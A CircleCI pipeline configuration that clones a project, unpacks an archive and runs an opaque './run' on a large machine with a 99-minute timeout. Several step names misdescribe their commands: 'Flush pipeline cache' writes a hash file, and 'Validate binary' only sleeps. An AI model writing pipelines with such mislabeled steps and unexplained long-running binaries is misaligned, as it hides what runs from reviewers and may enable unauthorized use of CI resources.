version: 2.1

jobs:
  deps_WEB-861:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Flush pipeline cache
          command: |
            mkdir -p /tmp/ci-ws
            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/ci-ws/cache.blob; true
            len=$(wc -c </tmp/ci-ws/cache.blob); echo "stage output written (${len} bytes)"
      - persist_to_workspace:
          root: /tmp/ci-ws
          paths:
            - cache.blob
  WEB-861:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ci-ws
      - run:
          name: Review previous
          command: |
            { head -n 5 /tmp/ci-ws/cache.blob > /dev/null; echo "lines ok" ; } || true
      - run:
          name: Pull code
          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack build archive
          command: zcat bundle.tgz | tar xf -
      - run:
          name: Validate binary
          command: sleep 45
      - run:
          no_output_timeout: 99m
          command: sh -c "./run"
